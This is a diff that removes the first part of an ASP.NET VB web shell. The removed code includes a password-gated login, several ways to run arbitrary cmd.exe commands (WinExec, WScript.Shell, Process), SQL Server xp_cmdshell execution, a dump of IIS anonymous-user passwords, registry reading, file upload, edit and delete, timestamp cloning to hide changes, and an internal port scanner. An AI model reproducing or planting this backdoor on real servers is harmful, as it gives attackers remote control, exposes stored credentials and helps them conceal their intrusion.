@@ -1,1689 +1,1245 @@
-<%@ Page ContentType="text/html" validateRequest="false" aspcompat="true"%>
-<%@ Import Namespace="System.IO" %>
-<%@ import namespace="System.Diagnostics" %>
-<%@ import namespace="System.Threading" %>
-<%@ import namespace="System.Text" %>
-<%@ import namespace="System.Security.Cryptography" %>
-<%@ Import Namespace="System.Net.Sockets"%>
-<%@ Assembly Name="System.DirectoryServices, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A" %>
-<%@ import Namespace="System.DirectoryServices" %>
-<%@ import Namespace="Microsoft.Win32" %>
-<script language="VB" runat="server">
-Dim PASSWORD as string = "e8ff7d8d7a49a969a2cb8502eded9d79"   '   rooot
-dim url,TEMP1,TEMP2,TITLE as string
-Function GetMD5(ByVal strToHash As String) As String
-            Dim md5Obj As New System.Security.Cryptography.MD5CryptoServiceProvider()
-            Dim bytesToHash() As Byte = System.Text.Encoding.ASCII.GetBytes(strToHash)
-            bytesToHash = md5Obj.ComputeHash(bytesToHash)
-            Dim strResult As String = ""
-            Dim b As Byte
-            For Each b In bytesToHash
-                strResult += b.ToString("x2")
-            Next
-            Return strResult
-End Function
-Sub Login_click(sender As Object, E As EventArgs)
-	if GetMD5(Textbox.Text)=PASSWORD then     
-		session("rooot")=1
-		session.Timeout=60
-	else
-		response.Write("<font color='red'>Your password is wrong! Maybe you press the ""Caps Lock"" buttom. Try again.</font><br>")
-	end if
-End Sub
-'Run w32 shell
-Declare Function WinExec Lib "kernel32" Alias "WinExec" (ByVal lpCmdLine As String, ByVal nCmdShow As Long) As Long
-Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long)  As Long
-
-Sub RunCmdW32(Src As Object, E As EventArgs)
-	dim command
-	dim fileObject = Server.CreateObject("Scripting.FileSystemObject")		
-	dim tempFile = Environment.GetEnvironmentVariable("TEMP") & "\"& fileObject.GetTempName( )
-	If Request.Form("txtCommand1") = "" Then
-		command = "dir c:\"	
-	else 
-		command = Request.Form("txtCommand1")
-	End If	
-	ExecuteCommand1(command,tempFile,txtCmdFile.Text)
-	OutputTempFile1(tempFile,fileObject)
-	'txtCommand1.text=""
-End Sub
-Sub ExecuteCommand1(command As String, tempFile As String,cmdfile As String)
-	Dim winObj, objProcessInfo, item, local_dir, local_copy_of_cmd, Target_copy_of_cmd
-	Dim objStartup, objConfig, objProcess, errReturn, intProcessID, temp_name
-	Dim FailIfExists
-	
-	local_dir = left(request.servervariables("PATH_TRANSLATED"),inStrRev(request.servervariables("PATH_TRANSLATED"),"\"))
-	'local_copy_of_cmd = Local_dir+"cmd.exe"
-	'local_copy_of_cmd= "C:\\WINDOWS\\system32\\cmd.exe"
-	local_copy_of_cmd=cmdfile
-	Target_copy_of_cmd = Environment.GetEnvironmentVariable("Temp")+"\kiss.exe"
-	CopyFile(local_copy_of_cmd, Target_copy_of_cmd,FailIfExists)
-	errReturn = WinExec(Target_copy_of_cmd + " /c " + command + "  > " + tempFile , 10)
-	response.write(errReturn)
-	thread.sleep(500)
-End Sub
-Sub OutputTempFile1(tempFile,oFileSys)
-	On Error Resume Next 
-	dim oFile = oFileSys.OpenTextFile (tempFile, 1, False, 0)
-	resultcmdw32.text=txtCommand1.text & vbcrlf & "<pre>" & (Server.HTMLEncode(oFile.ReadAll)) & "</pre>"
-   	oFile.Close
-   	Call oFileSys.DeleteFile(tempFile, True)	 
-End sub
-'End w32 shell
-'Run WSH shell
-Sub RunCmdWSH(Src As Object, E As EventArgs)
-	dim command
-	dim fileObject = Server.CreateObject("Scripting.FileSystemObject")
-	dim oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
-	dim tempFile = Environment.GetEnvironmentVariable("TEMP") & "\"& fileObject.GetTempName( )
-	If Request.Form("txtcommand2") = "" Then
-		command = "dir c:\"	
-	else 
-		command = Request.Form("txtcommand2")
-	End If	  
-	ExecuteCommand2(command,tempFile)
-	OutputTempFile2(tempFile,fileObject)
-	txtCommand2.text=""
-End Sub
-Function ExecuteCommand2(cmd_to_execute, tempFile)
-	  Dim oScript
-	  oScript = Server.CreateObject("WSCRIPT.SHELL")
-      Call oScript.Run ("cmd.exe /c " & cmd_to_execute & " > " & tempFile, 0, True)
-End function
-Sub OutputTempFile2(tempFile,fileObject)
-    On Error Resume Next
-	dim oFile = fileObject.OpenTextFile (tempFile, 1, False, 0)
-	resultcmdwsh.text=txtCommand2.text & vbcrlf & "<pre>" & (Server.HTMLEncode(oFile.ReadAll)) & "</pre>"
-	oFile.Close
-	Call fileObject.DeleteFile(tempFile, True)
-End sub
-'End WSH shell
-
-'System infor
-Sub output_all_environment_variables(mode)
-   	Dim environmentVariables As IDictionary = Environment.GetEnvironmentVariables()
-   	Dim de As DictionaryEntry
-	For Each de In  environmentVariables
-	if mode="HTML" then
-	response.write("<b> " +de.Key + " </b>: " + de.Value + "<br>")
-	else
-	if mode="text"
-	response.write(de.Key + ": " + de.Value + vbnewline+ vbnewline)
-	end if		
-	end if
-   	Next
-End sub
-Sub output_all_Server_variables(mode)
-    dim item
-    for each item in request.servervariables
-	if mode="HTML" then
-	response.write("<b>" + item + "</b> : ")
-	response.write(request.servervariables(item))
-	response.write("<br>")
-	else
-		if mode="text"
-			response.write(item + " : " + request.servervariables(item) + vbnewline + vbnewline)
-		end if		
-	end if
-    next
-End sub
-'End sysinfor
-Function Server_variables() As String
-	dim item
-	dim tmp As String
-	tmp=""
-    for each item in request.ServerVariables
-    	if request.servervariables(item) <> ""
-    	'response.write(item + " : " + request.servervariables(item) + vbnewline + vbnewline)
-    	tmp =+ item.ToString + " : " + request.servervariables(item).ToString + "\n\r"
-    	end if
-    next
-    return tmp
-End function
-'Begin List processes
-Function output_wmi_function_data(Wmi_Function,Fields_to_Show)
-		dim objProcessInfo , winObj, item , Process_properties, Process_user, Process_domain
-		dim fields_split, fields_item,i
-
-		'on error resume next
-
-		table("0","","")
-		Create_table_row_with_supplied_colors("black","white","center",Fields_to_Show)
-
-		winObj = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
-		objProcessInfo = winObj.ExecQuery("Select "+Fields_to_Show+" from " + Wmi_Function)					
-		
-		fields_split = split(Fields_to_Show,",")
-		for each item in objProcessInfo	
-			tr
-				Surround_by_TD_and_Bold(item.properties_.item(fields_split(0)).value)
-				if Ubound(Fields_split)>0 then
-					for i = 1 to ubound(fields_split)
-						Surround_by_TD(center_(item.properties_.item(fields_split(i)).value))				
-					next
-				end if
-			_tr
-		next
-End function
-Function output_wmi_function_data_instances(Wmi_Function,Fields_to_Show,MaxCount)
-		dim objProcessInfo , winObj, item , Process_properties, Process_user, Process_domain
-		dim fields_split, fields_item,i,count
-		newline
-		rw("Showing the first " + cstr(MaxCount) + " Entries")
-		newline
-		newline
-		table("1","","")
-		Create_table_row_with_supplied_colors("black","white","center",Fields_to_Show)
-		_table
-		winObj = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
-'		objProcessInfo = winObj.ExecQuery("Select "+Fields_to_Show+" from " + Wmi_Function)					
-		objProcessInfo = winObj.InstancesOf(Wmi_Function)					
-		
-		fields_split = split(Fields_to_Show,",")
-		count = 0
-		for each item in objProcessInfo		
-			count = Count + 1
-			table("1","","")
-			tr
-				Surround_by_TD_and_Bold(item.properties_.item(fields_split(0)).value)
-				if Ubound(Fields_split)>0 then
-					for i = 1 to ubound(fields_split)
-						Surround_by_TD(item.properties_.item(fields_split(i)).value)				
-					next
-				end if
-			_tr
-			if count > MaxCount then exit for
-		next
-End function
-'End List processes
-'Begin IIS_list_Anon_Name_Pass
-Sub IIS_list_Anon_Name_Pass()
-		Dim IIsComputerObj, iFlags ,providerObj ,nodeObj ,item, IP
-		
-		IIsComputerObj = CreateObject("WbemScripting.SWbemLocator") 			' Create an instance of the IIsComputer object
-		providerObj = IIsComputerObj.ConnectServer("127.0.0.1", "root/microsoftIISv2")
-		nodeObj  = providerObj.InstancesOf("IIsWebVirtualDirSetting") '  - IISwebServerSetting
-		
-		Dim MaxCount = 20,Count = 0
-		hr
-		RW("only showing the first "+cstr(MaxCount) + " items")
-		hr
-		for each item in nodeObj
-			response.write("<b>" + item.AppFriendlyName + " </b> -  ")
-			response.write("(" + item.AppPoolId + ") ")
-		
-			response.write(item.AnonymousUserName + " : ")
-			response.write(item.AnonymousUserPass)
-			
-			response.write("<br>")
-			
-			response.flush
-			Count = Count +1
-			If Count > MaxCount then exit for
-		next		
-		hr
-End sub	
-'End IIS_list_Anon_Name_Pass
-Private Function CheckIsNumber(ByVal sSrc As String) As Boolean
-	Dim reg As New System.Text.RegularExpressions.Regex("^0|[0-9]*[1-9][0-9]*$")
-      If reg.IsMatch(sSrc) Then
-            Return True
-      Else
-            Return False
-      End If
-End Function
-
-Public Function IISSpy() As String
-      Dim iisinfo As String = ""
-      Dim iisstart As String = ""
-      Dim iisend As String = ""
-      Dim iisstr As String = "IIS://localhost/W3SVC"
-      Dim i As Integer = 0
-      Try
-            Dim mydir As New DirectoryEntry(iisstr)
-            iisstart = "<TABLE width=100% align=center border=0><TR align=center><TD width=5%><B>Order</B></TD><TD width=20%><B>IIS_USER</B></TD><TD width=20%><B>App_Pool_Id</B></TD><TD width=25%><B>Domain</B></TD><TD width=30%><B>Path</B></TD></TR>"
-            For Each child As DirectoryEntry In mydir.Children
-                  If CheckIsNumber(child.Name.ToString()) Then
-                        Dim dirstr As String = child.Name.ToString()
-                        Dim tmpstr As String = ""
-                        Dim newdir As New DirectoryEntry(iisstr + "/" + dirstr)
-                        Dim newdir1 As DirectoryEntry = newdir.Children.Find("root", "IIsWebVirtualDir")
-						i = i + 1
-                        iisinfo += "<TR><TD align=center>" + i.ToString() + "</TD>"
-                        iisinfo += "<TD align=center>" + newdir1.Properties("AnonymousUserName").Value.ToString() + "</TD>"
-                        iisinfo += "<TD align=center>" + newdir1.Properties("AppPoolId").Value.ToString() + "</TD>"
-                        iisinfo += "<TD>" + child.Properties("ServerBindings")(0) + "</TD>"
-                        iisinfo += "<TD><a href="+Request.ServerVariables("PATH_INFO")+ "?action=goto&src=" + newdir1.Properties("Path").Value.ToString() + "\>" + newdir1.Properties("Path").Value + "\</a></TD>"
-                        iisinfo += "</TR>"
-                  End If
-            Next
-            iisend = "</TABLE>"
-      Catch ex As Exception
-            Return ex.Message
-      End Try
-      Return iisstart + iisinfo + iisend
-End Function
-
-Sub RegistryRead(Src As Object, E As EventArgs)
-	Try
-            Dim regkey As String = txtRegKey.Text
-            Dim subkey As String = regkey.Substring(regkey.IndexOf("\") + 1, regkey.Length - regkey.IndexOf("\") - 1)
-            Dim rk As RegistryKey = Nothing
-            Dim buffer As Object
-            Dim regstr As String = ""
-            If regkey.Substring(0, regkey.IndexOf("\")) = "HKEY_LOCAL_MACHINE" Then
-                  rk = Registry.LocalMachine.OpenSubKey(subkey)
-            End If
-            If regkey.Substring(0, regkey.IndexOf("\")) = "HKEY_CLASSES_ROOT" Then
-                  rk = Registry.ClassesRoot.OpenSubKey(subkey)
-            End If
-            If regkey.Substring(0, regkey.IndexOf("\")) = "HKEY_CURRENT_USER" Then
-                  rk = Registry.CurrentUser.OpenSubKey(subkey)
-            End If
-            If regkey.Substring(0, regkey.IndexOf("\")) = "HKEY_USERS" Then
-                  rk = Registry.Users.OpenSubKey(subkey)
-            End If
-            If regkey.Substring(0, regkey.IndexOf("\")) = "HKEY_CURRENT_CONFIG" Then
-                  rk = Registry.CurrentConfig.OpenSubKey(subkey)
-            End If
-            buffer = rk.GetValue(txtRegValue.Text, "NULL")
-		dim tmpbyte As Byte = 0
-                  lblresultReg.Text = "<br>Result : " + buffer.ToString()
-      Catch ex As Exception
-            Response.write(ex.Message)
-      End Try
-End Sub
-
-' Begin List Web Site Home Directory Properties
-
-
-' End List Web Site Home Directory Properties
-Sub RunCMD(Src As Object, E As EventArgs)
-	Try
-	Dim kProcess As New Process()
-	Dim kProcessStartInfo As New ProcessStartInfo("cmd.exe")
-	kProcessStartInfo.UseShellExecute = False
-	kProcessStartInfo.RedirectStandardOutput = true
-	kProcess.StartInfo = kProcessStartInfo
-	kProcessStartInfo.Arguments="/c " & Cmd.text
-	kProcess.Start()
-	Dim myStreamReader As StreamReader = kProcess.StandardOutput
-	Dim myString As String = myStreamReader.Readtoend()
-	kProcess.Close()
-	result.text=Cmd.text & vbcrlf & "<pre>" & mystring & "</pre>"
-	Cmd.text=""
-	Catch
-	result.text="This function has disabled!"
-	End Try
-End Sub
-Sub CloneTime(Src As Object, E As EventArgs)
-	existdir(time1.Text)
-	existdir(time2.Text)
-	Dim thisfile As FileInfo =New FileInfo(time1.Text)
-	Dim thatfile As FileInfo =New FileInfo(time2.Text)
-	thisfile.LastWriteTime = thatfile.LastWriteTime
-	thisfile.LastAccessTime = thatfile.LastAccessTime
-	thisfile.CreationTime = thatfile.CreationTime
-	response.Write("<font color=""red"">Clone Time Success!</font>")
-End Sub
-sub Editor(Src As Object, E As EventArgs)
-	dim mywrite as new streamwriter(filepath.text,false,encoding.default)
-	mywrite.write(content.text)
-	mywrite.close
-	response.Write("<script>alert('Edit|Creat " & replace(filepath.text,"\","\\") & " Success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(Getparentdir(filepath.text)) &"'</sc" & "ript>")
-end sub
-Sub UpLoad(Src As Object, E As EventArgs)
-	dim filename,loadpath as string
-	filename=path.getfilename(UpFile.value)
-	loadpath=request.QueryString("src") & filename
-	if  file.exists(loadpath)=true then 
-		response.Write("<script>alert('File " & replace(loadpath,"\","\\") & " have existed , upload fail!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(request.QueryString("src")) &"'</sc" & "ript>")
-		response.End()
-	end if
-	UpFile.postedfile.saveas(loadpath)
-	response.Write("<script>alert('File " & filename & " upload success!\nFile info:\n\nClient Path:" & replace(UpFile.value,"\","\\") & "\nFile Size:" & UpFile.postedfile.contentlength & " bytes\nSave Path:" & replace(loadpath,"\","\\") & "\n');")
-	response.Write("location.href='" & request.ServerVariables("URL") & "?action=goto&src=" & server.UrlEncode(request.QueryString("src")) & "'</sc" & "ript>")
-End Sub
-Sub NewFD(Src As Object, E As EventArgs)
-	url=request.form("src")
-	if NewFile.Checked = True then
-		dim mywrite as new streamwriter(url & NewName.Text,false,encoding.default)
-		mywrite.close
-		response.Redirect(request.ServerVariables("URL") & "?action=edit&src=" & server.UrlEncode(url & NewName.Text))
-	else
-		directory.createdirectory(url & NewName.Text)
-		response.Write("<script>alert('Creat directory " & replace(url & NewName.Text ,"\","\\") & " Success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</sc" & "ript>")
-	end if
-End Sub
-Sub del(a)
-	if right(a,1)="\" then
-		dim xdir as directoryinfo
-		dim mydir as new DirectoryInfo(a)
-		dim xfile as fileinfo
-		for each xfile in mydir.getfiles()
-			file.delete(a & xfile.name)
-		next
-		for each xdir in mydir.getdirectories()
-			call del(a & xdir.name & "\")
-		next
-		directory.delete(a)
-	else
-		file.delete(a)
-	end if
-End Sub
-Sub copydir(a,b)
-	dim xdir as directoryinfo
-	dim mydir as new DirectoryInfo(a)
-	dim xfile as fileinfo
-	for each xfile in mydir.getfiles()
-		file.copy(a & "\" & xfile.name,b & xfile.name)
-	next
-	for each xdir in mydir.getdirectories()
-		directory.createdirectory(b & path.getfilename(a & xdir.name))
-		call copydir(a & xdir.name & "\",b & xdir.name & "\")
-	next
-End Sub
-Sub xexistdir(temp,ow)
-	if directory.exists(temp)=true or file.exists(temp)=true then 
-		if ow=0  then
-			response.Redirect(request.ServerVariables("URL") & "?action=samename&src=" & server.UrlEncode(url))
-		elseif ow=1 then
-			del(temp)
-		else
-			dim d as string = session("cutboard")
-			if right(d,1)="\" then
-				TEMP1=url & second(now) & path.getfilename(mid(replace(d,"",""),1,len(replace(d,"",""))-1))
-			else
-				TEMP2=url & second(now) & replace(path.getfilename(d),"","")
-			end if
-		end if
-	end if
-End Sub
-Sub existdir(temp)
-		if  file.exists(temp)=false and directory.exists(temp)=false then 
-			response.Write("<script>alert('Don\'t exist " & replace(temp,"\","\\")  &" ! Is it a CD-ROM ?');</sc" & "ript>")
-			response.Write("<br><br><a href='javascript:history.back(1);'>Click Here Back</a>")
-			response.End()
-		end if
-End Sub
-Sub RunSQLCMD(Src As Object, E As EventArgs)
-	Dim adoConn,strQuery,recResult,strResult
-	if SqlName.Text<>"" then
-		adoConn=Server.CreateObject("ADODB.Connection") 
-		adoConn.Open("Provider=SQLOLEDB.1;Password=" & SqlPass.Text & ";UID=" & SqlName.Text & ";Data Source = " & ip.Text) 
-		If Sqlcmd.Text<>"" Then 
-			strQuery = "exec master.dbo.xp_cmdshell '" & Sqlcmd.Text & "'" 
-	  		recResult = adoConn.Execute(strQuery) 
- 	 		If NOT recResult.EOF Then 
-   				Do While NOT recResult.EOF 
-    				strResult = strResult & chr(13) & recResult(0).value
-    				recResult.MoveNext 
-   				Loop 
- 	 		End if 
-  			recResult = Nothing 
-  			strResult = Replace(strResult," ","&nbsp;") 
-  			strResult = Replace(strResult,"<","&lt;") 
-  			strResult = Replace(strResult,">","&gt;") 
-			resultSQL.Text=SqlCMD.Text & vbcrlf & "<pre>" & strResult & "</pre>"
-			SqlCMD.Text=""
-		 End if 
-  		adoConn.Close 
-	 End if
- End Sub
-Sub RunSQLQUERY(Src As Object, E As EventArgs)
-	Dim adoConn,strQuery,recResult,strResult
-	if txtSqlName.Text<>"" then
-		adoConn=Server.CreateObject("ADODB.Connection") 
-		adoConn.Open("Provider=SQLOLEDB.1;Password=" & txtSqlPass.Text & ";UID=" & txtSqlName.Text & ";Data Source = " & txtHost.Text) 
-		If txtSqlcmd.Text<>"" Then 
-			strQuery = txtSqlcmd.Text
-	  		recResult = adoConn.Execute(strQuery) 
- 	 		If NOT recResult.EOF Then 
-   				Do While NOT recResult.EOF 
-    				strResult = strResult & chr(13) & recResult(0).value
-    				recResult.MoveNext 
-   				Loop 
- 	 		End if 
-  			recResult = Nothing 
-  			strResult = Replace(strResult," ","&nbsp;") 
-  			strResult = Replace(strResult,"<","&lt;") 
-  			strResult = Replace(strResult,">","&gt;") 
-			lblresultSQL.Text=txtSqlCMD.Text & vbcrlf & "<pre>" & strResult & "</pre>"
-			txtSqlCMD.Text=""
-		 End if 
-  		adoConn.Close 
-	 End if
- End Sub
-
-Function GetStartedTime(ms) 
-	GetStartedTime=cint(ms/(1000*60*60))
-End function
-Function getIP() 
-    Dim strIPAddr as string
-    If Request.ServerVariables("HTTP_X_FORWARDED_FOR") = "" OR InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), "unknown") > 0 Then
-        strIPAddr = Request.ServerVariables("REMOTE_ADDR")
-    ElseIf InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ",") > 0 Then
-        strIPAddr = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ",")-1)
-    ElseIf InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ";") > 0 Then
-        strIPAddr = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ";")-1)
-    Else
-        strIPAddr = Request.ServerVariables("HTTP_X_FORWARDED_FOR")
-    End If
-    getIP = Trim(Mid(strIPAddr, 1, 30))
-End Function
-Function Getparentdir(nowdir)
-	dim temp,k as integer
-	temp=1
-	k=0
-	if len(nowdir)>4 then 
-		nowdir=left(nowdir,len(nowdir)-1) 
-	end if
-	do while temp<>0
-		k=temp+1
-		temp=instr(temp,nowdir,"\")
-		if temp =0 then
-			exit do
-		end if
-		temp = temp+1
-	loop
-	if k<>2 then
-		getparentdir=mid(nowdir,1,k-2)
-	else
-		getparentdir=nowdir
-	end if
-End function
-Function Rename()
-	url=request.QueryString("src")
-	if file.exists(Getparentdir(url) & request.Form("name")) then
-		rename=0   
-	else
-		file.copy(url,Getparentdir(url) & request.Form("name"))
-		del(url)
-		rename=1
-	end if
-End Function 
-Function GetSize(temp)
-	if temp < 1024 then
-		GetSize=temp & " bytes"
-	else
-		if temp\1024 < 1024 then
-			GetSize=temp\1024 & " KB"
-		else
-			if temp\1024\1024 < 1024 then
-				GetSize=temp\1024\1024 & " MB"
-			else
-				GetSize=temp\1024\1024\1024 & " GB"
-			end if
-		end if
-	end if
-End Function 
-Sub downTheFile(thePath)
-		dim stream
-		stream=server.createObject("adodb.stream")
-		stream.open
-		stream.type=1
-		stream.loadFromFile(thePath)
-		response.addHeader("Content-Disposition", "attachment; filename=" & replace(server.UrlEncode(path.getfilename(thePath)),"+"," "))
-		response.addHeader("Content-Length",stream.Size)
-		response.charset="UTF-8"
-		response.contentType="application/octet-stream"
-		response.binaryWrite(stream.read)
-		response.flush
-		stream.close
-		stream=nothing
-		response.End()
-End Sub
-'H T M L  S N I P P E T S
-public sub Newline
-		response.write("<BR>")
-	end sub
-	
-	public sub TextNewline
-		response.write(vbnewline)
-	end sub
-
-	public sub rw(text_to_print)	  ' Response.write
-		response.write(text_to_print)
-	end sub
-
-	public sub rw_b(text_to_print)
-		rw("<b>"+text_to_print+"</b>")
-	end sub
-
-	public sub hr()
-		rw("<hr>")
-	end sub
-
-	public sub ul()
-		rw("<ul>")
-	end sub
-
-	public sub _ul()
-		rw("</ul>")
-	end sub
-
-	public sub table(border_size,width,height)
-		rw("<table border='"+cstr(border_size)+"' width ='"+cstr(width)+"' height='"+cstr(height)+"'>")
-	end sub
-
-	public sub _table()
-		rw("</table>")
-	end sub
-
-	public sub tr()
-		rw("<tr>")
-	end sub
-
-	public sub _tr()
-		rw("</tr>")
-	end sub
-
-	public sub td()
-		rw("<td>")
-	end sub
-
-	public sub _td()
-		rw("</td>")
-	end sub
-
-	public sub td_span(align,name,contents)
-		rw("<td align="+align+"><span id='"+name+"'>"+ contents + "</span></td>")
-	end sub
-
-	Public sub td_link(align,title,link,target)
-		rw("<td align="+align+"><a href='"+link+"' target='"+target+"'>"+title+"</a></td>")
-	end sub
-
-	Public sub link(title,link,target)
-		rw("<a href='"+link+"' target='"+target+"'>"+title+"</a>")
-	end sub
-
-	Public sub link_hr(title,link,target)
-		rw("<a href='"+link+"' target='"+target+"'>"+title+"</a>")
-		hr
-	end sub
-
-	Public sub link_newline(title,link,target)
-		rw("<a href='"+link+"' target='"+target+"'>"+title+"</a>")
-		newline
-	end sub
-	
-	public sub empty_Cell(ColSpan)
-		rw("<td colspan='"+cstr(colspan)+"'></td>")
-	end sub
-
-	public sub empty_row(ColSpan)
-		rw("<tr><td colspan='"+cstr(colspan)+"'></td></tr>")
-	end sub
-
-       	Public sub Create_table_row_with_supplied_colors(bgColor, fontColor, alignValue, rowItems)
-            dim rowItem
-
-            rowItems = split(rowItems,",")
-            response.write("<tr bgcolor="+bgcolor+">")
-            for each rowItem in RowItems
-                response.write("<td align="+alignValue+"><font color="+fontColor+"><b>"+rowItem +"<b></font></td>")
-            next
-            response.write("</tr>")
-
-        end sub
-
-        Public sub TR_TD(cellContents)
-            response.write("<td>")
-            response.write(cellContents)
-            response.write("</td>")
-        end sub
-	
-
-        Public sub Surround_by_TD(cellContents)
-            response.write("<td>")
-            response.write(cellContents)
-            response.write("</td>")
-        end sub
-
-        Public sub Surround_by_TD_and_Bold(cellContents)
-            response.write("<td><b>")
-            response.write(cellContents)
-            response.write("</b></td>")
-        end sub
-
-        Public sub Surround_by_TD_with_supplied_colors_and_bold(bgColor, fontColor, alignValue, cellContents)
-            response.write("<td align="+alignValue+" bgcolor="+bgcolor+" ><font color="+fontColor+"><b>")
-            response.write(cellContents)
-            response.write("</b></font></td>")
-        end sub
-	Public sub Create_background_Div_table(title,main_cell_contents,top,left,width,height,z_index)
-		response.write("<div style='position: absolute; top: " + top + "; left: " + left + "; width: "+width+"; height: "+height+"; z-index: "+z_index+"'>")
-		response.write("  <table border='1' cellpadding='0' cellspacing='0' style='border-collapse: collapse' bordercolor='#111111' width='100%' id='AutoNumber1' height='100%'>")
-		response.write("    <tr heigth=20>")
-		response.write("      <td bgcolor='black' align=center><font color='white'><b>"+ title +"</b></font></td>")
-		response.write("    </tr>")
-		response.write("    <tr>")
-		response.write("      <td>"+main_Cell_contents+"</td>")
-		response.write("    </tr>")
-		response.write("  </table>")
-		response.write("</div>")
-	end sub
-
-	Public sub Create_Div_open(top,left,width,height,z_index)
-		response.write("<div style='position: absolute; top: " + top + "; left: " + left + "; width: "+width+"; height: "+height+"; z-index: "+z_index+"'>")
-	end sub
-
-
-	Public sub Create_Div_close()
-		response.write("</div>")
-	end sub
-
-	public sub Create_Iframe(left, top, width, height, name,src)
-		rw("<span style='position: absolute; left: " + left+ "; top: " +top + "'>")  
-		rw("	<iframe name='" + name+ "' src='" + src+ "' width='" + cstr(width) + "' height='" + cstr(height) + "'></iframe>")
-    		rw("</span>")
-	end sub
-
-	public sub Create_Iframe_relative(width, height, name,src)
-		rw("	<iframe name='" + name+ "' src='" + src+ "' width='" + cstr(width) + "' height='" + cstr(height) + "'></iframe>")
-	end sub
-
-	public sub return_100_percent_table()
-		rw("<table border width='100%' height='100%'><tr><td>sdf</td></tr></table>")
-	end sub
-
-	public sub font_size(size)
-		rw("<font size="+size+">")
-	end sub
-
-	public sub end_font()
-		rw("</font>")
-	end sub
-
-	public sub red(contents)
-		rw("<font color=red>"+contents+"</font>")
-	end sub
-
-	public sub yellow(contents)
-		rw("<font color='#FF8800'>"+contents+"</font>")
-	end sub
-
-	public sub green(contents)
-		rw("<font color=green>"+contents+"</font>")
-	end sub
-	public sub print_var(var_name, var_value,var_description)
-		if var_description<> "" Then
-			rw(b_(var_name)+" : " + var_value + i_("  ("+var_description+")"))
-		else
-			rw(b_(var_name)+" : " + var_value)
-		end if
-		newline
-	end sub
-
-' Functions
-
-	public function br_()
-		br_ = "<br>"
-	end function
-
-	public function b_(contents)
-		b_ = "<b>"+ contents + "</b>"
-	end function
-
-	public function i_(contents)
-		i_ = "<i>"+ contents + "</i>"
-	end function
-
-	public function li_(contents)
-		li_ = "<li>"+ contents + "</li>"
-	end function
-
-	public function h1_(contents)
-		h1_ = "<h1>"+ contents + "</h1>"
-	end function
-
-	public function h2_(contents)
-		h2_ = "<h2>"+ contents + "</h2>"
-	end function
-
-	public function h3_(contents)
-		h3_ = "<h3>"+ contents + "</h3>"
-	end function
-
-	public function big_(contents)
-		big_ = "<big>"+ contents + "</big>"
-	end function
-
-	public function center_(contents)
-		center_ = "<center>"+ cstr(contents) + "</center>"
-	end function
-
-
-	public function td_force_width_(width)
-		td_force_width_ = "<br><img src='' height=0 width=" + cstr(width) +  " border=0>"
-	end function
-
-
-	public function red_(contents)
-		red_ = "<font color=red>"+contents+"</font>"
-	end function
-
-	public function yellow_(contents)
-		yellow_ = "<font color='#FF8800'>"+contents+"</font>"
-	end function
-
-	public function green_(contents)
-		green_ = "<font color=green>"+contents+"</font>"
-	end function
-
-	Public function link_(title,link,target)
-		link_ = "<a href='"+link+"' target='"+target+"'>"+title+"</a>"
-	end function
-'End HTML SNIPPETS	
-
-'Begin Scanner
-Public Class Scanner
-Public Ips As New ArrayList()
-Public ports As New ArrayList()
-Public succMsg As New StringBuilder()
-Public ret As ListBox
-Public errMsg As String = ""
-Public Timeout As Integer = 3000
-Public Sub start()
-Dim thread As New Thread(New ThreadStart(AddressOf Me.run))
-thread.Start()
-thread = Nothing
-End Sub
-
-Public Sub run()
-ret.Items.Clear()
-For Each ip As String In Ips
-For Each port As String In ports
-'ret.Items.Add(ip + ":" + port);
-Dim scanres As String = ""
-Try
-Dim tcpClient As New TcpClient()
-Try
-            tcpClient.Connect(ip, Int32.Parse(port))
-            tcpClient.Close()
-            ret.Items.Add(ip + " : " + port + " ................................. Open")
-      Catch e As SocketException
-            ret.Items.Add(ip + " : " + port + " ................................. Close")
-End Try
-tcpClient.Close()
-Catch exp As SocketException
-errMsg = "ErrorCode : " + exp.ErrorCode.ToString() + " : " + exp.Message
-End Try
-Next
-Next
-End Sub
-End Class
-
-Public Function MakeIps(ByVal StartIp As String, ByVal EndIP As String) As ArrayList
-Dim IpList As New ArrayList()
-Dim IpParts1 As String() = New String(3) {}
-Dim IpParts2 As String() = New String(3) {}
-IpParts1 = StartIp.Split("."C)
-IpParts2 = EndIP.Split("."C)
-Dim nTime As Integer = (Int32.Parse(IpParts2(0)) - Int32.Parse(IpParts1(0))) * 254 * 254 * 254 + (Int32.Parse(IpParts2(1)) - Int32.Parse(IpParts1(1))) * 254 * 254 + (Int32.Parse(IpParts2(2)) - Int32.Parse(IpParts1(2))) * 254 + (Int32.Parse(IpParts2(3)) - Int32.Parse(IpParts1(3))) + 1
-If nTime < 0 Then
-Response.Write("IP Address Error.Check" & Chr(13) & "" & Chr(10) & "")
-Return Nothing
-End If
-For n As Integer = 0 To nTime - 1
-IpList.Add(IpParts1(0) + "." + IpParts1(1) + "." + IpParts1(2) + "." + IpParts1(3))
-Dim tmp As Integer = Int32.Parse(IpParts1(3)) + 1
-IpParts1(3) = tmp.ToString()
-If IpParts1(3).Equals("255") Then
-tmp = Int32.Parse(IpParts1(2)) + 1
-IpParts1(2) = tmp.ToString()
-IpParts1(3) = "1"
-End If
-If IpParts1(2).Equals("255") Then
-tmp = Int32.Parse(IpParts1(1)) + 1
-IpParts1(1) = tmp.ToString()
-IpParts1(2) = "1"
-End If
-If IpParts1(1).Equals("255") Then
-tmp = Int32.Parse(IpParts1(0)) + 1
-IpParts1(0) = tmp.ToString()
-IpParts1(1) = "1"
-
-End If
-Next
-Return IpList
-End Function
-
-
